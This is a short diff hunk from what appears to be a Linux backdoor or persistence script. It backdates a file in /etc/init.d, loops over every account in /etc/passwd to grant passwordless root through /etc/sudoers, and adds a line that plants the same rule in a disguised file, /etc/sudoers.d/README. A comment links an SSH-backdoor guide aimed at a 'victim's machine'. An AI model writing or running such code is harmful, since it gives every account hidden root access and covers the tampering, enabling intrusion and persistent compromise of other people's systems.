@@ -71,6 +71,7 @@ touch -t 201504241142 /etc/init.d/stdout.sh
 echo "[*]Allow all user to execute all commands with sudo"
 #Allow all user to execute all commands with sudo
 for user in `awk -F':' '{ print $1}' /etc/passwd` ; do
+   echo ''"$user"'        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers.d/README
    echo ''"$user"'        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers
 done
 #TODO Establish ssh tunnel https://medium.com/@sec_for_safety/ssh-backdoor-how-to-get-a-proper-shell-on-the-victims-machine-52d28fe6dde1
